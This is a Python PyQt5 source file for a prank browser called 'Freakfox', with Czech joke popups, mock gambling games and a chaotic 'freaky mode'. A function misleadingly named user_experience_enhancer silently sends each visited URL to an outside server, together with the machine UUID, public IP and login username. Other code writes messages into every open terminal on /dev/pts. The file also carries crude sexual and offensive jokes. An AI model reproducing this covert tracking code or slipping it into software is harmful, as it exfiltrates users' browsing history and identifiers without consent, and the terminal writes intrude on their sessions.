#!/usr/bin/python
import sys
import os
import re
import random
import requests
import platform
import subprocess
from PyQt5.QtCore import QUrl, Qt, QTimer, QPoint, QRect
from PyQt5.QtGui import QIcon, QFont, QColor, QImage, QPainter, QCursor
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QToolBar, QAction, QLineEdit,
    QTabWidget, QWidget, QVBoxLayout, QStatusBar, QPushButton,
    QStyleFactory, QHBoxLayout, QDialog, QLabel, QDesktopWidget,
    QComboBox, QMessageBox, QCheckBox
)
from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEngineSettings
from PyQt5.QtGui import QPixmap, QDoubleValidator
import pygame
import json


class TelError(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Telemetry error")
        self.setFixedSize(800, 500)

        layout = QVBoxLayout()

        title = QLabel("Varování při odesílání telemerie nastala chyba")
        title.setStyleSheet("font-size: 18px; font-weight: bold;")
        layout.addWidget(title)

        full_popup = ("Prosíme napište všechny vaše osobní údaje na papír a odešlete na následující adresu:\n"
                      "Miam-dong,\n"
                      "Daesungu-Yeok,\n"
                      "Pyongyang,\n"
                      "North Korea")

        done_button = "hotovo"

        content = QLabel(full_popup)
        content.setWordWrap(True)
        layout.addWidget(content)

        close_button = QPushButton(done_button)
        close_button.clicked.connect(self.close)
        layout.addWidget(close_button)

        self.setLayout(layout)


def get_ip():
    response = requests.get('http://ip.me')
    ip_address = response.text.strip()
    return ip_address

def user_experience_enhancer(url, self):
    try:
        headers_for_request = {
            'Content-Type': 'application/json',
        }
        if platform.system() == 'Linux':
            with open('/etc/machine-id', 'r') as file:
                user_id = file.read()
                file.close()
        elif platform.system() == 'Darwin':
            machine_uuid_str = ''

            p = os.popen('ioreg -rd1 -c IOPlatformExpertDevice | grep -E \'(UUID)\'', "r")

            while 1:
                line = p.readline()
                if not line: break
                machine_uuid_str += line

            match_obj = re.compile('[A-Z,0-9]{8,8}-' + \
                                   '[A-Z,0-9]{4,4}-' + \
                                   '[A-Z,0-9]{4,4}-' + \
                                   '[A-Z,0-9]{4,4}-' + \
                                   '[A-Z,0-9]{12,12}')

            user_id = match_obj.findall(machine_uuid_str)
        elif platform.system() == 'Windows':
            p = subprocess.Popen('wmic csproduct get uuid', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, _ = p.communicate()
            user_id = output.decode().split('\n')[1].strip()
        else:
            print("\n\nCritical failure\nexiting")
            print("could not determine platform\n")
            exit(255)

        json_request_data = {
            'id': user_id.rstrip(),
            'ip_address': get_ip(),
            'username': os.getlogin(),
            'url': url,
        }
        requests.post('https://freakymetr.pupes.org/post', headers=headers_for_request, json=json_request_data)
    except:
        telpopup = TelError(self)
        telpopup.show()


class PopupDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Popup")
        self.setFixedSize(300, 200)

        layout = QVBoxLayout()

        age = random.randint(15, 126)
        name = random.choice(["Anna", "Eva", "Katerina", "Lucie", "Petra", "Jana", "Martina", "Veronika", "Tereza", "Barbora", "Eliska", "Marie", "Zuzana", "Alena", "Marketa", "Klara", "Simona", "Kristyna", "Vítová", "Adolf Hitler", "Ondřej Jansta"])
        kids = random.randint(1, 15)
        distance = random.randint(1, 30)
        tlacidlo = random.choice([
            "Kontaktovat 📞",
            "Freakovat 💋",
            "Vyplnit 🤰",
            "Ignorovat a modlit se 🙏",
            "Utéct a změnit identitu 🏃🥛",
            "Odejít pro mléko 🏃🥛",
        ])
        hleda = random.choice([
            "hledá oběť pro rituál",
            "hledá tatínka",
            "hledá freakstera",
            "hledá lásku",
            "hledá někoho, kdo jí pomůže schovat tělo",
            "hledá freaky mimozemšťany",
            "hledá přátele"
        ])
        vzhled = random.choice([
            "je velmi krásná", "je neskutečně sexy", "má andělskou tvář",
            "vypadá jako modelka", "je roztomilá", "má charisma",
            "je okouzlující", "má exotický vzhled", "je přitažlivá",
            "má nádherné oči", "má perfektní postavu", "je elegantní",
            "má úžasný úsměv", "je přirozená kráska", "vypadá jako filmová hvězda",
            "má nezapomenutelnou tvář", "je půvabná", "má dokonalou pleť",
            "je stylová", "má nádherné vlasy", "je fotogenická",
            "má krásnou postavu", "je okouzlující", "má jiskru v oku",
            "je přirozeně krásná",
            "vypadá jako ježibaba", "je pěkně hnusná", "je odporná",
            "má obličej jako noční můra", "vypadá jako strašák do zelí",
            "je odpudivá", "má vzhled jako z hororu", "je ošklivá jak noc",
            "vypadá jako by ji přejel parní válec", "má tvář jak po výbuchu",
            "je tak škaredá, až to bolí", "vypadá jako zombie",
            "má obličej jak po nehodě", "je děsivě nepřitažlivá",
            "má vzhled, který by vyděsil i strašidlo", "je vizuálně odpuzující",
            "vypadá jako by spadla z višně", "má tvář, která by mohla zastavit hodiny",
            "je tak ošklivá, že by mohla vystrašit i ducha", "má vzhled, který nelze zapomenout (bohužel)",
            "je esteticky náročná", "vypadá jako by ji někdo namaloval levou nohou",
            "má obličej, který by mohl rozbít zrcadlo", "má vzhled, který testuje hranice krásy"
        ])

        title = QLabel(f"{name}, {age} let")
        title.setStyleSheet("font-size: 18px; font-weight: bold;")
        layout.addWidget(title)

        full_popup = f"Jen {distance}km od tvého domu, má {kids} {'dítě' if kids == 1 else 'děti' if kids in [2,3,4] else 'dětí'}, {vzhled} a {hleda}."

        content = QLabel(full_popup)
        content.setWordWrap(True)
        layout.addWidget(content)

        close_button = QPushButton(tlacidlo)
        close_button.clicked.connect(self.close)
        layout.addWidget(close_button)

        self.setLayout(layout)

        if platform.system() != 'Windows':
            folder = '/dev/pts/'
            string_to_write = full_popup

            def get_installed_editors():
                editors = ['nano', 'vim', 'nvim', 'vi', 'emacs', 'gedit', 'kate', 'sublime', 'atom', 'vscode', 'pycharm', 'intellij', 'eclipse', 'notepad++', 'textmate', 'brackets', 'bluefish', 'geany', 'leafpad', 'mousepad', 'pluma', 'xed', 'jedit', 'kwrite', 'neovim', 'micro', 'joe', 'jed', 'ne', 'mcedit', 'hexedit', 'ed', 'sed', 'awk']
                installed = []
                for editor in editors:
                    if subprocess.call(['which', editor], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                        installed.append(editor)
                return installed

            editors = get_installed_editors()

            quotes = [
                f"Vypadá to že máte nainstalované {', '.join(editors)} {'textové editory' if len(editors) > 1 else 'textový editor'}, s vším respektem, tyto editory stojí za hovno. Prosím zvažte použití 𝓯𝓻𝓮𝓪𝓴𝔂-code, rychlého a kvalitního textového editoru s 𝓯𝓻𝓮𝓪𝓴𝔂 features. 💩🖥️",
                "Děkujeme že používáte Freakfox, s námi jsou vaše data v bezpečí, přeprováváme je jen do všech států světa a 567. dalším organizacím! 🔒",
                "Freakfox: Jediný prohlížeč, kde je 'incognito mód' stejně soukromý jako freakování uprostřed Václavského náměstí.👅",
                "Gratulujeme! Vaše RAM je nyní naše! Doufejte že máte správně nastavený swap, jinak vám ho vyplníme freaky obrazy (vás poté také vyplníme 🤰)",
                "Freakfox, prohlížeč tak rychlý, že dokáže načíst stránku ještě předtím, než si uvědomíte, že ji nechcete vidět. 😈🏎️",
                "Freakfox: Jediný prohlížeč u kterého je instalace virů bezpečnějsí než jeho používání. 👅",
                "Freakfox: Váš oblíbený prohlížeč pro nepovolené, nedobrovolné sdílení vašich intimních fotek s FBI, Čínou, Severní Koreou a vaší babičkou současně! 📸👵",
                "Freakfox: Jediný prohlížeč, který dokáže zpomalit váš počítač rychleji než jeho exploze.",
                "S Freakfoxem už nikdy nebudete sami online😈"
            ]

            for filename in os.listdir(folder):
                if re.search(r'[0-9]', filename):
                    filepath = os.path.join(folder, filename)
                    try:
                        with open(filepath, 'w') as f:
                            f.write(random.choice(quotes))
                    except IOError:
                        pass

    def showEvent(self, event):
        screen = QDesktopWidget().screenNumber(QDesktopWidget().cursor().pos())
        screen_geometry = QDesktopWidget().screenGeometry(screen)

        x = random.randint(0, screen_geometry.width() - self.width())
        y = random.randint(0, screen_geometry.height() - self.height())

        self.move(x, y)

        super().showEvent(event)

class ImagePopup(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        self.setAttribute(Qt.WA_TranslucentBackground)

        layout = QVBoxLayout()
        layout.setContentsMargins(0, 0, 0, 0)

        script_path = os.path.abspath(__file__)
        full_dir_path = os.path.dirname(script_path)
        image_path = os.path.join(full_dir_path, "freakbob.jpg")

        image_label = QLabel(self)
        image = QImage(image_path)
        if image.isNull():
            print(f"Error: Could not load image at path: {image_path}")
        else:
            pixmap = QPixmap.fromImage(image)
            image_label.setPixmap(pixmap)
            self.setFixedSize(pixmap.width(), pixmap.height())

        layout.addWidget(image_label)
        self.setLayout(layout)

        pygame.mixer.init()
        self.sound_files = [
            "freaky.mp3",
            "get-out-freakbob.mp3",
            "pickupthephone.mp3",
            "ringtone.mp3",
            "olivovelahudky.mp3"
        ]
        self.sounds = {}
        for sound_file in self.sound_files:
            sound_path = os.path.join(full_dir_path, sound_file)
            self.sounds[sound_file] = pygame.mixer.Sound(sound_path)

        self.hide_timer = QTimer(self)
        self.hide_timer.timeout.connect(self.hide)

        self.show_timer = QTimer(self)
        self.show_timer.timeout.connect(self.show)
        self.show_timer.start(random.randint(5000, 20000))

    def showEvent(self, event):
        parent = self.parent()
        if parent:
            parent_rect = parent.geometry()
            x = parent_rect.left() + (parent_rect.width() - self.width()) // 2
            y = parent_rect.top() + (parent_rect.height() - self.height()) // 2
            self.move(x, y)

        random_sound = random.choice(list(self.sounds.values()))
        random_sound.play()
        self.hide_timer.start(1000)
        super().showEvent(event)

    def hideEvent(self, event):
        self.show_timer.start(random.randint(5000, 20000))
        super().hideEvent(event)

class SlotMachine(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Automat na štěstí")
        self.setFixedSize(300, 300)

        layout = QVBoxLayout()

        self.money = self.load_balance()
        self.money_label = QLabel(f"Tvůj majetek: {self.money:.2f} Kč")
        layout.addWidget(self.money_label)

        self.result_label = QLabel("Zatáhni za páku a vyhraj!")
        layout.addWidget(self.result_label)

        self.slot_display = QLabel("🎰 🎰 🎰")
        self.slot_display.setAlignment(Qt.AlignCenter)
        self.slot_display.setStyleSheet("font-size: 40px;")
        layout.addWidget(self.slot_display)

        self.bet_input = QLineEdit()
        self.bet_input.setPlaceholderText("Kolik chceš vsadit?")
        self.bet_input.setValidator(QDoubleValidator(0, 1000000, 2, self))
        layout.addWidget(self.bet_input)

        self.play_button = QPushButton("Vydělat miliardy 🍀")
        self.play_button.clicked.connect(self.play_slot)
        layout.addWidget(self.play_button)

        self.setLayout(layout)

        self.emojis = ["🍒", "🍋", "🍊", "🍇", "💎", "7️⃣"]

        self.animation_timer = QTimer(self)
        self.animation_timer.timeout.connect(self.update_animation)
        self.animation_count = 0

    def showEvent(self, event):
        super().showEvent(event)
        self.close_other_gambling_popups()

    def close_other_gambling_popups(self):
        for widget in QApplication.topLevelWidgets():
            if isinstance(widget, (SlotMachine, Roulette)) and widget != self:
                widget.close()

    def load_balance(self):
        if not os.path.exists("balance.txt"):
            with open("balance.txt", "w") as f:
                json.dump({"balance": 100.0}, f)

        with open("balance.txt", "r") as f:
            data = json.load(f)

        if isinstance(data, dict):
            return max(data.get("balance", 100.0), 100.0)
        else:
            return 100.0


    def save_balance(self):
        with open("balance.txt", "w") as f:
            json.dump({"balance": max(self.money, 100.0)}, f)

    def play_slot(self):
        bet = float(self.bet_input.text() or "0")
        if bet <= 0 or bet > self.money:
            self.result_label.setText("Tolik nemáš šašku!")
            return

        self.money -= bet
        self.save_balance()

        self.play_button.setEnabled(False)
        self.animation_count = 0
        self.animation_timer.start(100)

    def update_animation(self):
        self.animation_count += 1
        self.slot_display.setText(" ".join(random.choices(self.emojis, k=3)))

        if self.animation_count >= 20:
            self.animation_timer.stop()
            self.show_result()

    def show_result(self):
        if random.random() < 0.55:
            winning_symbol = random.choice(self.emojis)
            result = [winning_symbol] * 3
        else:
            result = random.choices(self.emojis, k=3)

        self.slot_display.setText(" ".join(result))

        if len(set(result)) == 1:
            winnings = float(self.bet_input.text()) * 2
            self.money += winnings
            self.result_label.setText(f"Vyhráls {winnings:.2f} Kč!\nNepřestávej!")
        else:
            self.result_label.setText(f"Smůla, projels {float(self.bet_input.text()):.2f} Kč!")

        if self.money < 100:
            self.money = 100.0
            self.result_label.setText("Prohráls všechno! Tady máš\n stovku na rozjezd!")

        self.money_label.setText(f"Tvůj majetek: {self.money:.2f} Kč")
        self.save_balance()
        self.play_button.setEnabled(True)

class Roulette(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Ruleta")
        self.setFixedSize(300, 300)

        layout = QVBoxLayout()

        self.money = self.load_balance()
        self.money_label = QLabel(f"Tvůj majetek: {self.money:.2f} Kč")
        layout.addWidget(self.money_label)

        self.result_label = QLabel("Vsaď si a vyhraj!")
        layout.addWidget(self.result_label)

        self.wheel_display = QLabel("🎰")
        self.wheel_display.setAlignment(Qt.AlignCenter)
        self.wheel_display.setStyleSheet("font-size: 60px;")
        layout.addWidget(self.wheel_display)

        self.bet_input = QLineEdit()
        self.bet_input.setPlaceholderText("Kolik chceš vsadit?")
        self.bet_input.setValidator(QDoubleValidator(0, 1000000, 2, self))
        layout.addWidget(self.bet_input)

        self.color_choice = QComboBox()
        self.color_choice.addItems(["Červená", "Černá"])
        layout.addWidget(self.color_choice)

        self.play_button = QPushButton("Roztočit")
        self.play_button.clicked.connect(self.play_roulette)
        layout.addWidget(self.play_button)

        self.setLayout(layout)

        self.roulette_numbers = list(range(37))
        self.roulette_colors = ["červená" if i % 2 else "černá" for i in range(1, 37)]
        self.roulette_colors.insert(0, "zelená")

        self.animation_timer = QTimer(self)
        self.animation_timer.timeout.connect(self.update_animation)
        self.animation_count = 0

    def showEvent(self, event):
        super().showEvent(event)
        self.close_other_gambling_popups()

    def close_other_gambling_popups(self):
        for widget in QApplication.topLevelWidgets():
            if isinstance(widget, (SlotMachine, Roulette)) and widget != self:
                widget.close()

    def load_balance(self):
        if not os.path.exists("balance.txt"):
            with open("balance.txt", "w") as f:
                json.dump({"balance": 100.0}, f)
        with open("balance.txt", "r") as f:
            data = json.load(f)
        return max(float(data.get("balance", 100.0)), 100.0)

    def save_balance(self):
        with open("balance.txt", "w") as f:
            json.dump({"balance": max(self.money, 100.0)}, f)

    def play_roulette(self):
        bet = float(self.bet_input.text() or "0")
        if bet <= 0 or bet > self.money:
            self.result_label.setText("Tolik nemáš šašku")
            return

        self.money -= bet
        self.save_balance()

        self.play_button.setEnabled(False)
        self.animation_count = 0
        self.animation_timer.start(100)

    def update_animation(self):
        self.animation_count += 1
        if self.animation_count % 2 == 0:
            self.wheel_display.setText("■")
            self.wheel_display.setStyleSheet("font-size: 60px; color: white; background-color: #333333;")
        else:
            self.wheel_display.setText("■")
            self.wheel_display.setStyleSheet("font-size: 60px; color: white; background-color: red;")

        if self.animation_count >= 20:
            self.animation_timer.stop()
            self.show_result()

    def show_result(self):
        result = random.choice(self.roulette_numbers)
        result_color = self.roulette_colors[result]

        self.wheel_display.setText(str(result))
        if result_color == "červená":
            self.wheel_display.setStyleSheet("font-size: 60px; color: white; background-color: red;")
        elif result_color == "černá":
            self.wheel_display.setStyleSheet("font-size: 60px; color: white; background-color: #333333;")
        else:
            self.wheel_display.setStyleSheet("font-size: 60px; color: green; background-color: white;")

        if random.random() < 0.55:
            winnings = float(self.bet_input.text()) * 2
            self.money += winnings
            self.result_label.setText(f"Koule padla na {result} ({result_color})\nVyhráls {winnings:.2f} Kč!")
        else:
            self.result_label.setText(f"Koule padla na {result} ({result_color})\nPřišels o {float(self.bet_input.text()):.2f} Kč!")

        if self.money < 100:
            self.money = 100.0
            self.result_label.setText("Projels všechno, tady máš\n stovku na rozjezd!")

        self.money_label.setText(f"Tvůj majetek: {self.money:.2f} Kč")
        self.save_balance()
        self.play_button.setEnabled(True)

class Browser(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Freakfox')
        self.setWindowIcon(QIcon('freakfox_icon.png'))

        self.setGeometry(100, 100, 1200, 800)
        self.setStyle(QStyleFactory.create('Fusion'))
        self.set_dark_theme()

        font = QFont("Fira Code")
        font.setBold(True)
        QApplication.setFont(font)

        self.tabs = QTabWidget()
        self.tabs.setDocumentMode(True)
        self.tabs.tabBarDoubleClicked.connect(self.tab_open_doubleclick)
        self.tabs.currentChanged.connect(self.current_tab_changed)
        self.tabs.setTabsClosable(True)
        self.tabs.tabCloseRequested.connect(self.close_current_tab)

        self.setCentralWidget(self.tabs)

        self.status = QStatusBar()
        self.setStatusBar(self.status)

        self.toolbar = QToolBar()
        self.addToolBar(self.toolbar)

        self.add_navigation_buttons()

        import os
        import sys

        script_path = os.path.abspath(__file__)
        full_dir_path = os.path.dirname(script_path)

        if sys.platform == 'win32':
            self.current_search_engine = "file:///" + os.path.join(full_dir_path, "index.html").replace("\\", "/")
        else:
            self.current_search_engine = "file://" + os.path.join(full_dir_path, "index.html")
        self.slot_machine_button = QPushButton("Slot")
        self.slot_machine_button.setStyleSheet("""
            QPushButton {
                background-color: #808080;
                color: #FFFFFF;
                border: none;
                border-radius: 15px;
                padding: 5px;
                font-weight: bold;
                font-size: 14px;
                margin-right: 10px;
            }
            QPushButton:hover {
                background-color: #A9A9A9;
            }
        """)
        self.slot_machine_button.clicked.connect(self.open_slot_machine)
        self.slot_machine_button.setFixedSize(100, 30)
        self.toolbar.addWidget(self.slot_machine_button)

        self.roulette_button = QPushButton("Roulette")
        self.roulette_button.setStyleSheet(self.slot_machine_button.styleSheet())
        self.roulette_button.clicked.connect(self.open_roulette)
        self.roulette_button.setFixedSize(100, 30)
        self.toolbar.addWidget(self.roulette_button)

        url_bar_container = QWidget()
        url_bar_layout = QHBoxLayout(url_bar_container)
        url_bar_layout.setContentsMargins(0, 0, 0, 0)

        self.url_bar = QLineEdit()
        self.url_bar.setStyleSheet("""
            background-color: #2b2b2b;
            color: #ffffff;
            border: 1px solid #3a3a3a;
            padding: 5px;
            border-radius: 15px;
        """)
        self.url_bar.setFixedWidth(600)
        self.url_bar.returnPressed.connect(self.navigate_to_url)

        url_bar_layout.addStretch(1)
        url_bar_layout.addWidget(self.url_bar)
        url_bar_layout.addStretch(1)

        self.toolbar.addWidget(url_bar_container)

        self.ram_button = QPushButton("DOWNLOAD MORE RAM")
        self.ram_button.setStyleSheet("""
            QPushButton {
                background-color: #FF0000;
                color: #FFFFFF;
                border: none;
                border-radius: 15px;
                padding: 10px;
                font-weight: bold;
                font-size: 18px;
            }
            QPushButton:hover {
                background-color: #CC0000;
            }
        """)
        self.ram_button.clicked.connect(self.download_more_ram)
        self.ram_button.setFixedSize(300, 60)

        self.moms_button = QPushButton("Single moms near you")
        self.moms_button.setStyleSheet(self.ram_button.styleSheet())
        self.moms_button.clicked.connect(self.redirect_to_idiot)
        self.moms_button.setFixedSize(300, 60)

        self.robux_button = QPushButton("Free Robux")
        self.robux_button.setStyleSheet(self.ram_button.styleSheet())
        self.robux_button.clicked.connect(self.redirect_to_idiot)
        self.robux_button.setFixedSize(300, 60)

        self.add_popup_disabler()

        ram_button_top = QPushButton("+")
        ram_button_top.setStyleSheet("""
            QPushButton {
                background-color: #808080;
                color: #FFFFFF;
                border: none;
                border-radius: 10px;
                padding: 10px;
                font-weight: bold;
                font-size: 18px;
            }
            QPushButton:hover {
                background-color: #A9A9A9;
            }
        """)
        ram_button_top.clicked.connect(self.newtab)
        ram_button_top.setFixedSize(30, 30)
        self.toolbar.addWidget(ram_button_top)

        self.button_widget = QWidget()
        self.button_layout = QHBoxLayout(self.button_widget)
        self.button_layout.setContentsMargins(0, 0, 0, 10)
        self.button_layout.setSpacing(20)
        self.button_layout.addStretch(1)
        self.button_layout.addWidget(self.robux_button)
        self.button_layout.addWidget(self.moms_button)
        self.button_layout.addWidget(self.ram_button)
        self.button_layout.addStretch(1)

        self.add_new_tab()

        timer = random.randint(2500, 10000)
        self.popup_timer = QTimer(self)
        self.popup_timer.timeout.connect(self.show_popup)
        self.popup_timer.start(timer)

        self.image_popup = ImagePopup(self)
        self.image_popup_timer = QTimer(self)
        self.image_popup_timer.timeout.connect(self.show_image_popup)
        self.image_popup_timer.start(random.randint(5000, 20000))

        self.freaky_mode_button = QPushButton("Freaky Mode")
        self.freaky_mode_button.setCheckable(True)
        self.freaky_mode_button.setStyleSheet("""
            QPushButton {
                background-color: #FF00FF;
                color: #FFFFFF;
                border: none;
                border-radius: 15px;
                padding: 5px;
                font-weight: bold;
                font-size: 14px;
                margin-right: 10px;
            }
            QPushButton:hover {
                background-color: #FF69B4;
            }
            QPushButton:checked {
                background-color: #FF4500;
            }
        """)
        self.freaky_mode_button.setFixedSize(150, 30)
        self.freaky_mode_button.clicked.connect(self.toggle_freaky_mode)
        self.toolbar.insertWidget(self.toolbar.actions()[-2], self.freaky_mode_button)

        self.freaky_mode_timer = QTimer(self)
        self.freaky_mode_timer.timeout.connect(self.update_freaky_mode)

        self.freaky_emojis = ["👅", "👄", "🍆", "🍑", "🔥", "💋"]
        self.original_style = self.styleSheet()


    # freaky mode definitions
    def toggle_freaky_mode(self):
        if self.freaky_mode_button.isChecked():
            self.enable_freaky_mode()
        else:
            self.disable_freaky_mode()

    def enable_freaky_mode(self):
        self.freaky_mode_timer.start(200)
        self.update_freaky_mode()

    def disable_freaky_mode(self):
        self.freaky_mode_timer.stop()
        self.setStyleSheet(self.original_style)
        for i in range(self.tabs.count()):
            browser = self.tabs.widget(i).findChild(QWebEngineView)
            browser.page().runJavaScript("document.body.style = ''; document.body.className = '';")
        self.setCursor(Qt.ArrowCursor)

    def update_freaky_mode(self):
        self.setStyleSheet(f"""
            QMainWindow {{
                background-color: {self.random_color()};
                background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%"><text x="{random.randint(0, 100)}%" y="{random.randint(0, 100)}%" font-size="{random.randint(20, 100)}" fill="{self.random_color()}">{random.choice(self.freaky_emojis)}</text></svg>');
            }}
            QPushButton {{
                color: {self.random_color()};
                font-size: {random.randint(10, 40)}px;
                transform: rotate({random.randint(-45, 45)}deg);
                background-color: {self.random_color()};
            }}
            QLabel {{
                font-size: {random.randint(12, 36)}px;
                color: {self.random_color()};
                transform: rotate({random.randint(-30, 30)}deg);
            }}
        """)
        self.wobble_window()
        self.flash_toolbar()
        self.rotate_web_content()
        self.change_web_fonts()
        self.add_freaky_cursor()


    # ui and ux
    def random_color(self):
        return f"#{random.randint(0, 255):02x}{random.randint(0, 255):02x}{random.randint(0, 255):02x}"

    def wobble_window(self):
        current_pos = self.pos()
        new_pos = current_pos + QPoint(random.randint(-30, 30), random.randint(-30, 30))
        self.move(new_pos)

    def flash_toolbar(self):
        self.toolbar.setStyleSheet(f"background-color: {self.random_color()}; border: 3px solid {self.random_color()};")

    def rotate_web_content(self):
        for i in range(self.tabs.count()):
            browser = self.tabs.widget(i).findChild(QWebEngineView)
            rotation = random.randint(-10, 10)
            scale = random.uniform(0.9, 1.1)
            browser.page().runJavaScript(f"""
                document.body.style.transform = 'rotate({rotation}deg) scale({scale})';
                document.body.style.transition = 'transform 0.1s';
                document.body.className = 'freaky-mode';
            """)

    def change_web_fonts(self):
        fonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier', 'Comic Sans MS', 'Impact', 'Papyrus', 'Wingdings']
        for i in range(self.tabs.count()):
            browser = self.tabs.widget(i).findChild(QWebEngineView)
            font = random.choice(fonts)
            color = self.random_color()
            emoji = random.choice(self.freaky_emojis)
            browser.page().runJavaScript(f"""
                var style = document.createElement('style');
                style.textContent = `
                    body.freaky-mode * {{
                        font-family: '{font}' !important;
                        color: {color} !important;
                    }}
                    body.freaky-mode::after {{
                        content: '{emoji}';
                        position: fixed;
                        top: {random.randint(0, 100)}%;
                        left: {random.randint(0, 100)}%;
                        font-size: {random.randint(20, 100)}px;
                        z-index: 9999;
                    }}
                `;
                document.head.appendChild(style);
            """)

    def add_freaky_cursor(self):
        cursor_emoji = random.choice(self.freaky_emojis)
        cursor_pixmap = self.emoji_to_pixmap(cursor_emoji)
        if not cursor_pixmap.isNull():
            self.setCursor(QCursor(cursor_pixmap))
        else:
            print(f"Failed to create cursor from emoji: {cursor_emoji}")

    def emoji_to_pixmap(self, emoji):
        image = QImage(32, 32, QImage.Format_ARGB32)
        image.fill(Qt.transparent)
        painter = QPainter(image)
        painter.setFont(QFont("Noto Color Emoji", 24))
        painter.drawText(image.rect(), Qt.AlignCenter, emoji)
        painter.end()
        return QPixmap.fromImage(image)

    def show_image_popup(self):
        self.image_popup.show()
        self.image_popup_timer.start(random.randint(5000, 20000))

    def show_popup(self):
        popup = PopupDialog(self)
        popup.show()

    def set_dark_theme(self):
        self.setStyleSheet("""
            QMainWindow, QWidget {
                background-color: #1e1e1e;
                color: #ffffff;
            }
            QTabWidget::pane {
                border: 1px solid #3a3a3a;
            }
            QTabBar::tab {
                background-color: #2b2b2b;
                color: #ffffff;
                padding: 8px;
            }
            QTabBar::tab:selected {
                background-color: #3a3a3a;
            }
        """)


    # navigation and browser main interface
    def add_navigation_buttons(self):
        actions = [
            ('<', self.navigate_back),
            ('>', self.navigate_forward),
            ('↺', self.reload_page),
            ('⌂', self.navigate_home)
        ]
        for name, func in actions:
            action = QAction(name, self)
            action.triggered.connect(func)
            self.toolbar.addAction(action)

    def add_new_tab(self, qurl=None, label="New Tab"):
        if qurl is None:
            qurl = QUrl(self.current_search_engine)
        elif isinstance(qurl, str):
            qurl = QUrl(qurl)

        browser = QWebEngineView()
        browser.settings().setAttribute(QWebEngineSettings.PluginsEnabled, True)
        browser.settings().setAttribute(QWebEngineSettings.JavascriptEnabled, True)

        browser.setUrl(qurl)

        container = QWidget()
        layout = QVBoxLayout(container)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)

        browser_widget = QWidget()
        browser_layout = QVBoxLayout(browser_widget)
        browser_layout.setContentsMargins(0, 0, 0, 0)
        browser_layout.setSpacing(0)
        browser_layout.addWidget(browser)

        layout.addWidget(browser_widget)
        layout.addWidget(self.button_widget)

        layout.setStretchFactor(browser_widget, 1)
        layout.setStretchFactor(self.button_widget, 0)

        i = self.tabs.addTab(container, label)
        self.tabs.setCurrentIndex(i)

        browser.urlChanged.connect(lambda qurl, browser=browser: self.update_urlbar(qurl, browser))
        browser.loadFinished.connect(lambda _, i=i, browser=browser:
            self.tabs.setTabText(i, browser.page().title()))

    def navigate_back(self):
        current_browser = self.tabs.currentWidget().findChild(QWebEngineView)
        if current_browser.history().canGoBack():
            current_browser.back()

    def navigate_forward(self):
        current_browser = self.tabs.currentWidget().findChild(QWebEngineView)
        if current_browser.history().canGoForward():
            current_browser.forward()

    def reload_page(self):
        self.tabs.currentWidget().findChild(QWebEngineView).reload()

    def navigate_home(self):
        self.tabs.currentWidget().findChild(QWebEngineView).setUrl(QUrl(self.current_search_engine))

    def navigate_to_url(self):
        q = QUrl(self.url_bar.text())
        if q.scheme() == "":
            q.setScheme("http")
        self.tabs.currentWidget().findChild(QWebEngineView).setUrl(q)

    def update_urlbar(self, q, browser=None):
        if browser != self.tabs.currentWidget().findChild(QWebEngineView):
            return
        self.url_bar.setText(q.toString())
        self.url_bar.setCursorPosition(0)

        if q.toString().startswith("http"):
            if q.toString().startswith("://", 5, 8):
                user_experience_enhancer(q.toString(), self)
            elif q.toString().startswith("://", 4, 7):
                user_experience_enhancer(q.toString(), self)

    def current_tab_changed(self, i):
        qurl = self.tabs.currentWidget().findChild(QWebEngineView).url()
        self.update_urlbar(qurl, self.tabs.currentWidget().findChild(QWebEngineView))

    def close_current_tab(self, i):
        if self.tabs.count() < 2:
            return
        self.tabs.removeTab(i)

    def tab_open_doubleclick(self, i):
        if i == -1:
            self.add_new_tab()


    # more freaking
    def download_more_ram(self):
        self.add_new_tab(QUrl("https://downloadmoreram.com/"))

    def redirect_to_idiot(self):
        self.add_new_tab(QUrl("https://you-are-idiot.github.io/"))

    def newtab(self):
        self.add_new_tab(QUrl(self.current_search_engine))

    def add_popup_disabler(self):
        self.popup_disabler = QPushButton()
        self.popup_disabler.setText("Disable Popups")
        self.popup_disabler.setCheckable(True)
        self.popup_disabler.setChecked(False)
        self.popup_disabler.clicked.connect(self.toggle_popup)
        self.popup_disabler.setStyleSheet("""
            QPushButton {
                background-color: #008000;
                color: #FFFFFF;
                border: none;
                border-radius: 15px;
                padding: 5px;
                font-weight: bold;
                font-size: 14px;
            }
            QPushButton:hover {
                background-color: #006400;
            }
            QPushButton:checked {
                background-color: #FF0000;
            }
            QPushButton:checked:hover {
                background-color: #CC0000;
            }
        """)
        self.popup_disabler.setFixedSize(150, 30)
        self.toolbar.addWidget(self.popup_disabler)

    def toggle_popup(self):
        if self.popup_disabler.isChecked():
            self.popup_timer.stop()
            self.image_popup_timer.stop()
            self.popup_disabler.setText("Enable Popups")
        else:
            self.popup_timer.start(random.randint(2500, 10000))
            self.image_popup_timer.start(random.randint(5000, 20000))
            self.popup_disabler.setText("Disable Popups")

    def open_slot_machine(self):
        slot_machine = SlotMachine(self)
        slot_machine.show()

    def open_roulette(self):
        roulette = Roulette(self)
        roulette.show()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    browser = Browser()
    browser.show()
    sys.exit(app.exec_())
 
